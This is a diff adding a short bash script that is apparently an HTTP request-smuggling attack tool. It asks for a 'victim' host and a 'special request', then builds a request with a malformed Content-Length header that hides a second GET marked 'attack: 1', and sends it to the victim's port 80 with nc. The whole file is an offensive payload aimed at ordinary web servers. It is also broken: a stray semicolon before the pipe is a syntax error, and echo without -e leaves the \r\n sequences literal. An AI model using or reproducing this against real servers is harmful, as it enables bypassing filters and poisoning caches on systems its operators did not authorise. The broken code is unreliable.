@@ -1,0 +1,16 @@
+#!/bin/bash
+echo -ne "[+] Enter Victim: "
+read victim
+
+echo -ne "[+] Enter Special Request: "
+read special
+
+
+echo "GET / HTTP/1.1\r\n
+Host: $victim\r\n
+Content-Length : 78\r\n
+\r\n
+GET $special HTTP/1.1\r\n
+Host: $victim\r\n
+attack: 1\r\n
+foo:"; | nc $victim 80
